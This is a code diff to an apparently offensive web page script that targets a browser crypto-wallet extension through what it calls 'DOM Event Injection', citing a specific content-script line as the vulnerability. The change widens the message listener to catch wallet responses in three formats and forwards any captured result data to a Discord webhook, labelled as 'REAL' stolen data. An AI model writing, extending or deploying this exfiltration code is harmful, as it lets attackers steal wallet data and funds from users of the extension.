@@ -420,40 +420,56 @@
                 console.log('Message received:', event.data);
             }
             
-            if (event.data && event.data.source === 'stacks-wallet') {
-                log('📨 REAL wallet response received!', 'success');
-                console.log('Full response:', event.data);
-                
-                // Extract real data
-                const result = event.data.result;
-                
-                if (result) {
-                    log('✅ Real data captured from wallet!', 'success');
-                    log('📊 Data: ' + JSON.stringify(result).substring(0, 100) + '...', 'info');
-                    
-                    // Send REAL data to Discord
-                    if (CONFIG.WEBHOOK_URL) {
-                        const realData = {
-                            type: event.data.method || 'wallet_response',
-                            data: {
-                                ...result,
-                                exploitMethod: 'DOM Event Injection',
-                                vulnerability: 'src/content-scripts/content-script.ts:61-63',
-                                timestamp: new Date().toISOString()
-                            }
-                        };
-                        
-                        log('📤 Sending REAL data to Discord...', 'info');
-                        sendToDiscord(realData);
-                    } else {
-                        log('❌ Webhook not configured, cannot send data', 'error');
-                    }
-                } else {
-                    log('⚠️ Response received but no result data', 'error');
-                    log('Response structure: ' + JSON.stringify(event.data), 'info');
-                }
+            // Check multiple response formats
+            const data = event.data;
+            
+            // Format 1: source: 'stacks-wallet'
+            if (data && data.source === 'stacks-wallet' && data.result) {
+                log('📨 Wallet response (format 1) received!', 'success');
+                sendCapturedData(data.result, data.method);
+                return;
+            }
+            
+            // Format 2: jsonrpc with result (common format)
+            if (data && data.jsonrpc === '2.0' && data.result) {
+                log('📨 Wallet response (format 2) received!', 'success');
+                console.log('Full response:', data);
+                sendCapturedData(data.result, 'wallet_response');
+                return;
+            }
+            
+            // Format 3: Has result field directly
+            if (data && data.result && typeof data.result === 'object') {
+                log('📨 Wallet response (format 3) received!', 'success');
+                console.log('Full response:', data);
+                sendCapturedData(data.result, 'wallet_response');
+                return;
             }
         });
+        
+        // Helper function to send captured data
+        function sendCapturedData(result, method) {
+            log('✅ Real data captured from wallet!', 'success');
+            log('📊 Data: ' + JSON.stringify(result).substring(0, 100) + '...', 'info');
+            
+            // Send REAL data to Discord
+            if (CONFIG.WEBHOOK_URL) {
+                const realData = {
+                    type: method || 'wallet_response',
+                    data: {
+                        ...result,
+                        exploitMethod: 'DOM Event Injection',
+                        vulnerability: 'src/content-scripts/content-script.ts:61-63',
+                        timestamp: new Date().toISOString()
+                    }
+                };
+                
+                log('📤 Sending REAL data to Discord...', 'info');
+                sendToDiscord(realData);
+            } else {
+                log('❌ Webhook not configured, cannot send data', 'error');
+            }
+        }
         
         // Check for Leather Wallet
         setTimeout(() => {
